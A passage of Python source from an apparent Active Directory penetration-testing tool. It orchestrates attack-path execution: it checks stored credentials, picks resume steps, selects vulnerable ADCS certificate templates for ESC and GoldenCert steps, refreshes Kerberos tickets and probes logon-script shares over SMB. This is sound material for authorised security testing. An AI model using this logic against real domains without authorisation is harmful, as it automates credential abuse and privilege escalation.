            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_ready_count": 0,
            "execution_candidate_count": 1,
            "execution_candidate_source": "from_label_user_node",
            "execution_readiness_reason": "from_label_missing_stored_credential",
            "execution_context_action": action,
        }

    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    affected_users = meta.get("affected_users") if isinstance(meta, dict) else None
    affected_count = _affected_user_count(summary)
    if isinstance(affected_users, list) and affected_users:
        ready_users: list[str] = []
        for raw_user in affected_users:
            if not isinstance(raw_user, str):
                continue
            normalized = _normalize_account(raw_user)
            if normalized and normalized in stored_creds:
                ready_users.append(normalized)
        ready_users = list(dict.fromkeys(ready_users))
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
        "execution_target_matched_ips": list(target_matched_ips),
        "execution_target_vantage_mode": target_vantage_mode,
        "execution_target_execution_advisory": target_execution_advisory,
        "execution_target_access_requirement": target_access_requirement,
        "execution_target_label": to_label,
        "execution_ready_count": len(ready_users),
            "execution_candidate_count": affected_count or len(affected_users),
            "execution_candidate_source": "affected_users",
            "execution_readiness_reason": (
                "affected_users_intersection"
                if ready_users
                else "no_stored_credential_for_affected_users"
            ),
            "execution_context_action": action,
        }

    if stored_creds:
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_ready_count": len(stored_creds),
            "execution_candidate_count": len(stored_creds),
            "execution_candidate_source": "all_stored_credentials_fallback",
            "execution_readiness_reason": "all_stored_credentials_fallback",
            "execution_context_action": action,
        }

    return {
        "execution_context_required": True,
        "execution_support_status": "supported",
        "execution_support_target_kind": target_kind or "",
        "execution_target_enabled": target_enabled,
        "execution_target_enabled_source": target_enabled_source,
        "execution_target_viability_status": target_viability_status,
        "execution_target_viability_summary": target_viability_summary,
        "execution_target_viability_reason": target_viability_reason,
        "execution_target_reachable": target_reachable,
        "execution_target_reachable_source": target_reachable_source,
        "execution_target_resolved": target_resolved,
        "execution_target_matched_ips": list(target_matched_ips),
        "execution_target_vantage_mode": target_vantage_mode,
        "execution_target_execution_advisory": target_execution_advisory,
        "execution_ready_count": 0,
        "execution_candidate_count": 0,
        "execution_candidate_source": "unresolved",
        "execution_readiness_reason": "no_stored_credentials_available",
        "execution_context_action": action,
    }


def _annotate_execution_readiness(
    shell: Any,
    *,
    domain: str,
    summaries: list[dict[str, Any]],
    context_username: str | None,
    context_password: str | None,
) -> list[dict[str, Any]]:
    """Attach execution readiness metadata used by the attack-path UX."""
    annotated: list[dict[str, Any]] = []
    for summary in summaries:
        current = dict(summary)
        meta = current.get("meta")
        if not isinstance(meta, dict):
            meta = {}
            current["meta"] = meta
        else:
            meta = dict(meta)
            current["meta"] = meta
        readiness = _execution_readiness_meta(
            shell,
            domain=domain,
            summary=current,
            context_username=context_username,
            context_password=context_password,
        )
        if readiness:
            meta.update(readiness)
        annotated.append(current)
    return annotated


def _path_has_ready_execution_context(summary: dict[str, Any]) -> bool:
    """Return True when a path has usable execution context or does not require it."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return True
    if not meta.get("execution_context_required"):
        return True
    ready_count = meta.get("execution_ready_count")
    return isinstance(ready_count, int) and ready_count > 0


def _path_is_supported_for_execution(summary: dict[str, Any]) -> bool:
    """Return False when the path is pre-identified as unsupported or blocked."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return True
    return str(meta.get("execution_support_status") or "").strip().lower() not in {
        "unsupported",
        "blocked",
    }


def _path_is_actionable_for_execution_prompt(
    summary: dict[str, Any],
    *,
    desired_statuses: set[str] | None,
) -> bool:
    """Return True when a path is worth re-prompting for execution."""
    status = str(summary.get("status") or "theoretical").strip().lower()
    if desired_statuses is not None and not _status_allowed_by_filter(
        status, desired_statuses
    ):
        return False
    if status not in {"theoretical", "attempted"}:
        return False
    if not _path_is_supported_for_execution(summary):
        return False
    if not _path_has_ready_execution_context(summary):
        return False
    return True


def _execution_block_message(meta: dict[str, Any]) -> tuple[str, str]:
    """Return user-visible warning and debug reason for one blocked execution summary."""
    support_reason = str(meta.get("execution_support_reason") or "").strip()
    readiness_reason = str(meta.get("execution_readiness_reason") or "").strip()
    viability_summary = str(meta.get("execution_target_viability_summary") or "").strip()
    if support_reason:
        return support_reason, readiness_reason or "execution_blocked"
    if viability_summary:
        return viability_summary, readiness_reason or "execution_blocked"
    return (
        "This path is currently blocked by target viability or execution policy.",
        readiness_reason or "execution_blocked",
    )


def _summarize_non_actionable_paths(
    summaries: list[dict[str, Any]],
    *,
    desired_statuses: set[str] | None,
) -> tuple[int, dict[str, int]]:
    """Return count and reason buckets for non-actionable path summaries."""
    reasons = {
        "exploited": 0,
        "blocked": 0,
        "unsupported": 0,
        "unavailable": 0,
        "needs_context": 0,
        "status_filtered": 0,
        "other": 0,
    }
    for summary in summaries:
        status = str(summary.get("status") or "theoretical").strip().lower()
        if desired_statuses is not None and not _status_allowed_by_filter(
            status, desired_statuses
        ):
            reasons["status_filtered"] += 1
            continue
        if status == "exploited":
            reasons["exploited"] += 1
            continue
        if status == "blocked":
            reasons["blocked"] += 1
            continue
        if status == "unsupported":
            reasons["unsupported"] += 1
            continue
        if status == "unavailable":
            reasons["unavailable"] += 1
            continue
        meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
        support_status = (
            str(meta.get("execution_support_status") or "").strip().lower()
            if isinstance(meta, dict)
            else ""
        )
        if support_status == "blocked":
            reasons["blocked"] += 1
            continue
        if not _path_is_supported_for_execution(summary):
            reasons["unsupported"] += 1
            continue
        if not _path_has_ready_execution_context(summary):
            reasons["needs_context"] += 1
            continue
        reasons["other"] += 1
    return sum(reasons.values()), reasons


def _format_non_actionable_reason_summary(reasons: dict[str, int]) -> str:
    """Return a compact visible breakdown of non-actionable path reasons."""
    parts: list[str] = []
    labels = (
        ("exploited", "exploited"),
        ("blocked", "blocked"),
        ("unsupported", "unsupported"),
        ("unavailable", "unavailable"),
        ("needs_context", "needs_context"),
        ("status_filtered", "filtered"),
        ("other", "other"),
    )
    for key, label in labels:
        count = int(reasons.get(key, 0) or 0)
        if count > 0:
            parts.append(f"{label}={count}")
    return ", ".join(parts) if parts else "none"


def _choose_custom_attack_path_start_step(
    shell: Any,
    *,
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    default_step_idx: int,
) -> int | None:
    """Let the operator choose a custom executable step index."""
    if not hasattr(shell, "_questionary_select"):
        return default_step_idx

    options: list[str] = []
    default_option_idx = 0
    for option_idx, step_idx in enumerate(executable_indices):
        step_item = steps[step_idx - 1] if step_idx - 1 < len(steps) else {}
        action = str(step_item.get("action") or "N/A").strip() or "N/A"
        status = str(step_item.get("status") or "discovered").strip().lower()
        from_label = (
            str(
                (step_item.get("details") or {}).get("from")
                if isinstance(step_item.get("details"), dict)
                else ""
            ).strip()
            or "?"
        )
        to_label = (
            str(
                (step_item.get("details") or {}).get("to")
                if isinstance(step_item.get("details"), dict)
                else ""
            ).strip()
            or "?"
        )
        options.append(
            f"Step #{step_idx}: {action} [{status}] {from_label} -> {to_label}"
        )
        if step_idx == default_step_idx:
            default_option_idx = option_idx
    options.append("Cancel execution")

    selection = shell._questionary_select(
        "Choose a custom start step:",
        options,
        default_idx=default_option_idx,
    )
    if selection is None:
        return None
    if selection >= len(executable_indices):
        return None
    return executable_indices[selection]


def _find_next_attack_path_executable_step_index(
    executable_indices: list[int],
    current_step_index: int,
) -> int | None:
    """Return the next executable step index after one current step index."""
    for candidate in executable_indices:
        if candidate > current_step_index:
            return candidate
    return None


def _resolve_attack_path_step_password(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    context_username: str | None,
    context_password: str | None,
) -> str:
    """Resolve the password ADscan would use for one execution principal."""
    if not exec_username:
        return ""
    if (
        context_username
        and _normalize_account(context_username) == _normalize_account(exec_username)
        and context_password
    ):
        return str(context_password)
    return str(_resolve_domain_password(shell, domain, exec_username) or "")


def _attack_path_step_has_executable_context(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    step_index: int,
    context_username: str | None,
    context_password: str | None,
) -> bool:
    """Return whether ADscan could execute one step with the current context."""
    if step_index < 1 or step_index > len(steps):
        return False
    step_item = steps[step_index - 1]
    if not isinstance(step_item, dict):
        return False

    step_action = str(step_item.get("action") or "").strip()
    step_key = step_action.lower()
    step_details = (
        step_item.get("details") if isinstance(step_item.get("details"), dict) else {}
    )
    from_label = str(step_details.get("from") or "").strip()
    to_label = str(step_details.get("to") or "").strip()
    if not step_action:
        return False

    if step_key in ACL_ACE_RELATIONS:
        try:
            exec_context = build_ace_step_context(
                shell,
                domain,
                relation=step_action,
                summary=summary,
                from_label=from_label,
                to_label=to_label,
                context_username=context_username,
                context_password=context_password,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            return False
        return bool(
            str(getattr(exec_context, "exec_username", "") or "").strip()
            and str(getattr(exec_context, "exec_password", "") or "").strip()
        )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    exec_password = _resolve_attack_path_step_password(
        shell,
        domain=domain,
        exec_username=exec_username or "",
        context_username=context_username,
        context_password=context_password,
    )
    if not exec_username or not exec_password:
        return False

    if step_key in {"adminto", "sqladmin", "canrdp", "canpsremote"}:
        return bool(
            to_label
            and resolve_netexec_target_for_node_label(
                shell,
                domain,
                node_label=to_label,
            )
        )
    if step_key == "allowedtodelegate":
        return bool(from_label and to_label)
    if step_key == "writelogonscript":
        domain_data = (
            getattr(shell, "domains_data", {}).get(domain, {})
            if isinstance(getattr(shell, "domains_data", None), dict)
            else {}
        )
        return bool(
            str(step_details.get("host") or "").strip()
            or _resolve_default_domain_controller(domain_data, domain)
        )
    return True


def _attack_path_processed_step_is_bypassable(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    step_index: int,
    step_status: str,
    context_username: str | None,
    context_password: str | None,
) -> bool:
    """Return whether one processed step can be skipped while continuing the path."""
    next_step_index = _find_next_attack_path_executable_step_index(
        executable_indices,
        step_index,
    )
    if next_step_index is None:
        return str(step_status or "").strip().lower() == "success"
    return _attack_path_step_has_executable_context(
        shell,
        domain=domain,
        summary=summary,
        steps=steps,
        step_index=next_step_index,
        context_username=context_username,
        context_password=context_password,
    )


def _resolve_attack_path_start_step(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    non_executable_actions: set[str],
    dangerous_actions: set[str],
    summary: dict[str, Any],
    context_username: str | None = None,
    context_password: str | None = None,
) -> int | None:
    """Return selected start step index for attack path execution."""
    if not executable_indices:
        return None

    first_executable_idx = executable_indices[0]
    rerun_success_steps = _env_flag_enabled("ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS")
    if rerun_success_steps:
        print_info_verbose(
            "ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS enabled: re-running from step #1."
        )
        return first_executable_idx

    first_pending_idx: int | None = None
    first_execution_required_idx: int | None = None
    completed_steps = 0
    for step_idx, step_item in enumerate(steps, start=1):
        if not isinstance(step_item, dict):
            continue
        step_action = str(step_item.get("action") or "").strip().lower()
        if step_action in non_executable_actions:
            continue
        if step_action in dangerous_actions:
            continue
        step_status = str(step_item.get("status") or "discovered").strip().lower()
        if step_status == "success":
            if _attack_path_processed_step_is_bypassable(
                shell,
                domain=domain,
                summary=summary,
                steps=steps,
                executable_indices=executable_indices,
                step_index=step_idx,
                step_status=step_status,
                context_username=context_username,
                context_password=context_password,
            ):
                completed_steps += 1
                continue
            first_execution_required_idx = step_idx
            break
        if step_status == "attempted":
            if _attack_path_processed_step_is_bypassable(
                shell,
                domain=domain,
                summary=summary,
                steps=steps,
                executable_indices=executable_indices,
                step_index=step_idx,
                step_status=step_status,
                context_username=context_username,
                context_password=context_password,
            ):
                continue
            first_execution_required_idx = step_idx
            break
        first_execution_required_idx = step_idx
        if step_status in {"", "discovered", "theoretical"}:
            first_pending_idx = step_idx
            break

    domain_auth = (
        str(getattr(shell, "domains_data", {}).get(domain, {}).get("auth") or "")
        .strip()
        .lower()
    )
    domain_pwned = domain_auth == "pwned"

    default_start_idx = (
        first_execution_required_idx or first_pending_idx or first_executable_idx
    )
    non_interactive = is_non_interactive(shell)

    if domain_pwned and first_pending_idx is None:
        if non_interactive:
            print_info_debug(
                "[attack_paths] no fresh steps remain for pwned domain; skipping path re-execution: "
                f"domain={mark_sensitive(domain, 'domain')}"
            )
            return None
        if not hasattr(shell, "_questionary_select"):
            print_info(
                "No fresh executable steps remain in this attack path. "
                "Skipping re-execution because the domain is already compromised."
            )
            print_info_verbose(
                "Use ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS=1 or choose a custom "
                "start step to force re-execution."
            )
            return first_executable_idx if Confirm.ask(
                "This path has no fresh executable steps left. Re-run from the first step?",
                default=False,
            ) else None

        options = [
            "Skip execution (Recommended)",
            f"Re-run from step #{first_executable_idx}",
            "Choose custom start step",
        ]
        choice = shell._questionary_select(
            "This path has no fresh executable steps left. What do you want to do?",
            options,
            default_idx=0,
        )
        if choice is None or choice == 0:
            return None
        if choice == 1:
            return first_executable_idx
        if choice == 2:
            return _choose_custom_attack_path_start_step(
                shell,
                steps=steps,
                executable_indices=executable_indices,
                default_step_idx=first_execution_required_idx or first_executable_idx,
            )
        return None

    # If no pending steps, default to not re-execute unless explicitly requested.
    if first_execution_required_idx is None:
        if non_interactive:
            return None
        if not hasattr(shell, "_questionary_select"):
            print_info(
                "All executable steps in this attack path are already marked as success."
            )
            print_info_verbose(
                "Set ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS=1 to force re-execution "
                "from the first step."
            )
            return first_executable_idx if Confirm.ask(
                "All executable steps are already successful. Re-run from the first step?",
                default=False,
            ) else None

        options = [
            "Skip execution (Recommended)",
            f"Re-run from step #{first_executable_idx}",
            "Choose custom start step",
        ]
        choice = shell._questionary_select(
            "All executable steps are already successful. What do you want to do?",
            options,
            default_idx=0,
        )
        if choice is None or choice == 0:
            return None
        if choice == 1:
            return first_executable_idx
        if choice == 2:
            return _choose_custom_attack_path_start_step(
                shell,
                steps=steps,
                executable_indices=executable_indices,
                default_step_idx=first_executable_idx,
            )
        return None

    if completed_steps <= 0:
        return default_start_idx
    if non_interactive:
        return default_start_idx

    resume_label = (
        "first pending step"
        if first_pending_idx is not None
        else "first required step"
    )

    if not hasattr(shell, "_questionary_select"):
        print_info(
            f"Resuming from step #{default_start_idx} ({resume_label})."
        )
        print_info_verbose(
            f"Skipping {completed_steps} previously successful step(s)."
        )
        return default_start_idx

    options = [
        f"Resume from step #{default_start_idx} (Recommended)",
        f"Re-run from step #{first_executable_idx}",
        "Choose custom start step",
        "Cancel execution",
    ]
    choice = shell._questionary_select(
        "This path is partially executed. Choose how to continue:",
        options,
        default_idx=0,
    )
    if choice is None or choice >= len(options) - 1:
        return None
    if choice == 0:
        print_info(
            f"Resuming from step #{default_start_idx} ({resume_label})."
        )
        return default_start_idx
    if choice == 1:
        return first_executable_idx
    if choice == 2:
        return _choose_custom_attack_path_start_step(
            shell,
            steps=steps,
            executable_indices=executable_indices,
            default_step_idx=default_start_idx,
        )
    return None


def _extract_cert_template_name_from_label(
    *,
    domain: str,
    to_label: str | None,
) -> str | None:
    """Best-effort extraction of a certificate template name from a step target label."""
    raw = str(to_label or "").strip()
    if not raw:
        return None
    if raw.strip().lower() == str(domain or "").strip().lower():
        return None
    if "\\" in raw:
        raw = raw.split("\\", 1)[1].strip()
    if "@" in raw:
        left, _, right = raw.partition("@")
        if right and right.strip().lower() == str(domain or "").strip().lower():
            raw = left.strip()
    return raw.strip() or None


def _extract_cert_templates_from_step_details(
    details: dict[str, Any],
    *,
    template_field: str = "template",
    list_field: str = "templates",
    summary_field: str = "templates_summary",
) -> list[str]:
    """Extract certificate template names from attack-step details."""

    templates: list[str] = []

    template_name = details.get(template_field)
    if isinstance(template_name, str) and template_name.strip():
        templates.append(template_name.strip())

    raw_templates = details.get(list_field)
    if isinstance(raw_templates, list):
        for entry in raw_templates:
            name = None
            if isinstance(entry, dict):
                name = entry.get("name") or entry.get("template")
            elif isinstance(entry, str):
                name = entry
            if isinstance(name, str) and name.strip():
                templates.append(name.strip())

    summary = details.get(summary_field)
    if isinstance(summary, str) and summary.strip() and not raw_templates:
        for item in summary.split(","):
            candidate = item.strip()
            if not candidate or candidate.startswith("+"):
                continue
            if "(" in candidate:
                candidate = candidate.split("(", 1)[0].strip()
            if candidate:
                templates.append(candidate)

    if not templates:
        return []

    unique = sorted(
        {t for t in templates if isinstance(t, str) and t.strip()}, key=str.lower
    )
    return unique


def _extract_cert_templates_by_role(
    details: dict[str, Any],
    *,
    role: str,
) -> list[str]:
    """Extract role-specific certificate templates from attack-step details."""
    role_key = str(role or "").strip().lower()
    if role_key not in {"agent", "target"}:
        return []
    return _extract_cert_templates_from_step_details(
        details,
        template_field=f"{role_key}_template",
        list_field=f"{role_key}_templates",
        summary_field=f"{role_key}_templates_summary",
    )


def _status_allowed_by_filter(status: str, desired_statuses: set[str] | None) -> bool:
    """Return True when status passes the optional execution filter."""
    if desired_statuses is None:
        return True
    return status in desired_statuses


def _select_adcs_template(
    shell: Any,
    *,
    esc_number: str,
    templates: list[str],
    default_idx: int = 0,
    prompt_label: str = "template",
) -> str | None:
    """Select a certificate template from candidates (prompt if needed)."""

    if not templates:
        return None

    template = templates[0]
    if len(templates) > 1 and hasattr(shell, "_questionary_select"):
        options = list(templates) + ["Cancel"]
        idx = shell._questionary_select(
            f"Select an ESC{esc_number} {prompt_label} to use:",
            options,
            default_idx=default_idx,
        )
        if idx is None or idx >= len(options) - 1:
            return None
        template = templates[idx]
    return template


def _resolve_adcs_template_candidates(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    password: str,
    esc_number: str,
    details: dict[str, Any],
    to_label: str | None,
    domain_data: dict[str, Any],
    allow_object_control: bool = False,
) -> list[str]:
    """Resolve certificate templates for an ADCS ESC step."""

    esc_tag = str(esc_number).strip()
    esc_templates = _extract_cert_templates_from_step_details(details)
    if esc_templates:
        marked = ", ".join(mark_sensitive(t, "service") for t in esc_templates)
        print_info_debug(
            f"[adcsesc{esc_tag}] Using certificate template(s) from attack step details: "
            f"{marked}"
        )
        return esc_templates

    template_from_step = _extract_cert_template_name_from_label(
        domain=domain,
        to_label=to_label,
    )
    if template_from_step:
        print_info_debug(
            f"[adcsesc{esc_tag}] Using certificate template from attack step target: "
            f"{mark_sensitive(template_from_step, 'service')}"
        )
        return [template_from_step]

    if allow_object_control:
        try:
            from adscan_internal.services.attack_graph_service import (
                resolve_certipy_esc4_templates_for_principal,
            )

            esc_templates = resolve_certipy_esc4_templates_for_principal(
                shell,
                domain=domain,
                principal_samaccountname=exec_username,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            esc_templates = []
        if esc_templates:
            return esc_templates

    try:
        from adscan_internal.services.exploitation import ExploitationService

        pdc_hostname = domain_data.get("pdc_hostname")
        target_host = None
        if isinstance(pdc_hostname, str) and pdc_hostname.strip():
            target_host = (
                pdc_hostname if "." in pdc_hostname else f"{pdc_hostname}.{domain}"
            )
        auth = shell.build_auth_certipy(domain, exec_username, password)
        output_prefix = None
        domain_dir = domain_data.get("dir")
        if isinstance(domain_dir, str) and domain_dir:
            adcs_dir = os.path.join(domain_dir, "adcs")
            os.makedirs(adcs_dir, exist_ok=True)
            if allow_object_control:
                safe_user = re.sub(r"[^a-zA-Z0-9_.-]+", "_", exec_username)
                output_prefix = os.path.join(adcs_dir, f"certipy_find_{safe_user}")
            else:
                output_prefix = os.path.join(adcs_dir, "certipy_find")
        service = ExploitationService()
        result = service.adcs.enum_privileges(
            certipy_path=shell.certipy_path,
            pdc_ip=domain_data["pdc"],
            target_host=target_host,
            auth_string=auth,
            output_prefix=output_prefix,
            timeout=300,
            run_command=getattr(shell, "run_command", None),
            vulnerable_only=bool(allow_object_control),
            use_cached_json=not allow_object_control,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            f"Failed to enumerate ADCS templates for ESC{mark_sensitive(esc_tag, 'service')}."
        )
        return []

    if not getattr(result, "success", False):
        print_warning(
            "ADCS privilege enumeration failed; cannot select "
            f"ESC{mark_sensitive(esc_tag, 'service')} template."
        )
        return []

    esc_templates = [
        v.template
        for v in getattr(result, "vulnerabilities", [])
        if getattr(v, "esc_number", None) == esc_tag and getattr(v, "template", None)
    ]
    esc_templates = [t for t in esc_templates if isinstance(t, str) and t.strip()]
    return sorted(set(esc_templates), key=str.lower)


def _prompt_for_manual_adcs_template(
    *,
    esc_number: str,
    default: str | None = None,
) -> str | None:
    """Prompt the operator for a manual certificate template name."""

    if os.getenv("CI") or not sys.stdin.isatty() or not sys.stdout.isatty():
        return None

    prompt_default = default or ""
    try:
        response = Prompt.ask(
            f"Enter an ESC{esc_number} certificate template name (blank to cancel)",
            default=prompt_default,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return None

    if not isinstance(response, str):
        return None
    response = response.strip()
    return response or None


def _resolve_execution_user(
    shell: Any,
    *,
    domain: str,
    context_username: str | None,
    summary: dict[str, object],
    from_label: str | None,
    max_options: int = 20,
) -> str | None:
    """Resolve an execution user for attack steps that require credentials."""
    return _shared_resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
        max_options=max_options,
    )


def _resolve_golden_cert_execution_user(
    shell: Any,
    *,
    domain: str,
    context_username: str | None,
    summary: dict[str, object],
    from_label: str | None,
) -> str | None:
    """Resolve execution user for GoldenCert, preferring CA machine account creds."""
    domains_data = getattr(shell, "domains_data", None)
    domain_data = (
        domains_data.get(domain)
        if isinstance(domains_data, dict) and isinstance(domains_data.get(domain), dict)
        else {}
    )
    creds = domain_data.get("credentials") if isinstance(domain_data, dict) else {}
    if isinstance(creds, dict) and creds:
        from_user = _normalize_account(from_label or "")
        cred_keys = {str(k).lower(): str(k) for k in creds.keys()}
        if from_user.endswith("$") and from_user in cred_keys:
            selected = cred_keys[from_user]
            print_info_debug(
                "[goldencert] Using CA machine credential from step source: "
                f"{mark_sensitive(selected, 'user')}"
            )
            return selected

    return _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )


def _resolve_golden_cert_target_host(
    shell: Any,
    *,
    domain: str,
    from_label: str | None,
    domain_data: dict[str, Any],
) -> str | None:
    """Resolve target CA host for GoldenCert."""
    if from_label:
        resolved = resolve_netexec_target_for_node_label(
            shell,
            domain,
            node_label=from_label,
        )
        if isinstance(resolved, str) and resolved.strip():
            return resolved.strip()

    adcs_host = domain_data.get("adcs")
    if isinstance(adcs_host, str) and adcs_host.strip():
        return adcs_host.strip()

    pdc_host = domain_data.get("pdc_hostname")
    if isinstance(pdc_host, str) and pdc_host.strip():
        return pdc_host.strip()
    return None


def _sorted_paths(paths: list[dict[str, Any]]) -> list[dict[str, Any]]:
    from adscan_internal.services.attack_step_support_registry import (
        build_path_priority_key,
    )

    return sorted(paths, key=build_path_priority_key)


def _find_first_step(summary: dict[str, Any], *, action: str) -> dict[str, Any] | None:
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return None
    needle = (action or "").strip().lower()
    for step in steps:
        if not isinstance(step, dict):
            continue
        if str(step.get("action") or "").strip().lower() != needle:
            continue
        return step
    return None


def _resolve_domain_password(shell: object, domain: str, username: str) -> str | None:
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return None
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return None
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return None
    value = creds.get(username)
    if not isinstance(value, str) or not value:
        return None
    return value


def _resolve_default_domain_controller(domain_data: dict[str, Any], domain: str) -> str | None:
    """Return the preferred DC target for SMB-backed execution helpers."""
    dc_fqdn = domain_data.get("pdc_hostname_fqdn") or domain_data.get("pdc_fqdn")
    if isinstance(dc_fqdn, str) and dc_fqdn.strip():
        return dc_fqdn.strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip()
    if pdc_hostname:
        return pdc_hostname if "." in pdc_hostname else f"{pdc_hostname}.{domain}"
    pdc_ip = str(domain_data.get("pdc") or "").strip()
    return pdc_ip or None


def _prepare_kerberos_for_smb_execution(
    shell: Any,
    *,
    operation_name: str,
    domain: str,
    username: str,
    credential: str,
    domain_data: dict[str, Any],
) -> bool:
    """Prepare Kerberos env for one SMB-backed step and refresh expired tickets when possible."""
    if not bool(domain_data.get("kerberos_tickets")):
        return False

    workspace_dir = str(
        getattr(shell, "current_workspace_dir", "")
        or getattr(shell, "_get_workspace_cwd", lambda: "")()
        or ""
    )
    use_kerberos = prepare_kerberos_ldap_environment(
        operation_name=operation_name,
        target_domain=domain,
        workspace_dir=workspace_dir,
        username=str(username),
        user_domain=str(domain),
        domains_data=getattr(shell, "domains_data", {}),
        sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
    )
    if not use_kerberos:
        return False

    ticket_service = KerberosTicketService()
    ticket_path = ticket_service.get_ticket_for_user(
        workspace_dir=workspace_dir,
        domain=domain,
        username=username,
        domains_data=getattr(shell, "domains_data", {}),
    )
    ticket_state = ticket_service.is_ticket_valid(ticket_path=ticket_path or "")
    if ticket_state is not False:
        return True

    dc_ip = str(domain_data.get("pdc") or "").strip() or None
    print_warning_debug(
        "[writelogonscript] Kerberos ticket appears expired before SMB operation; "
        f"refreshing ticket for {mark_sensitive(username, 'user')} in "
        f"{mark_sensitive(domain, 'domain')}"
    )
    auto_generate = getattr(shell, "_auto_generate_kerberos_ticket", None)
    if not callable(auto_generate):
        return True
    try:
        refreshed = auto_generate(username, credential, domain, dc_ip)
        if not refreshed:
            return True
        return prepare_kerberos_ldap_environment(
            operation_name=f"{operation_name} (ticket refresh)",
            target_domain=domain,
            workspace_dir=workspace_dir,
            username=str(username),
            user_domain=str(domain),
            domains_data=getattr(shell, "domains_data", {}),
            sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "[writelogonscript] Kerberos ticket refresh failed before SMB operation; "
            f"user={mark_sensitive(username, 'user')} "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"error={mark_sensitive(str(exc), 'text')}"
        )
        return True


def _execute_writelogonscript_precheck(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    from_label: str,
    to_label: str,
    details: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
) -> tuple[str, dict[str, Any]]:
    """Confirm logon-script staging access by uploading a benign batch file probe."""
    from adscan_internal.services.smb_path_access_service import SMBPathAccessService
    from adscan_internal.services.attack_graph_service import (
        _build_writelogonscript_staging_candidates,
    )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    if not exec_username:
        return (
            "blocked",
            {"reason": "no_usable_execution_context"},
        )
    password = context_password or _resolve_domain_password(shell, domain, exec_username)
    if not password:
        return (
            "blocked",
            {
                "reason": "missing_execution_password",
                "user": exec_username,
            },
        )

    domains_data = getattr(shell, "domains_data", None)
    domain_data = (
        domains_data.get(domain)
        if isinstance(domains_data, dict) and isinstance(domains_data.get(domain), dict)
        else {}
    )
    target_host = str(details.get("host") or "").strip() or _resolve_default_domain_controller(domain_data, domain) or ""
    if not target_host:
        return ("failed", {"reason": "missing_target_host"})

    use_kerberos = _prepare_kerberos_for_smb_execution(
        shell,
        operation_name="WriteLogonScript execution precheck",
        domain=domain,
        username=str(exec_username),
        credential=password,
        domain_data=domain_data,
    )

    probe_service = SMBPathAccessService()
    candidate_map = {
        f"{str(candidate.get('share') or '').strip().upper()}|{str(candidate.get('path') or '').strip()}": candidate
        for candidate in _build_writelogonscript_staging_candidates(domain)
    }
    detail_candidates = details.get("staging_candidates")
    ordered_candidates: list[dict[str, Any]] = []
    if isinstance(detail_candidates, list):
        validated = []
        unknown = []
        denied = []
        for item in detail_candidates:
            if not isinstance(item, dict):
                continue
            bucket = (
                validated
                if str(item.get("validation") or "").strip().lower() == "validated"
                else denied
                if str(item.get("validation") or "").strip().lower() == "denied"
                else unknown
            )
            bucket.append(item)
        ordered_candidates = validated + unknown
        if not ordered_candidates and denied:
            return (
                "blocked",
                {
                    "reason": "staging_acl_denied",
                    "user": exec_username,
                    "target_host": target_host,
                    "staging_candidates": denied,
                },
            )
    if not ordered_candidates:
        ordered_candidates = list(candidate_map.values())

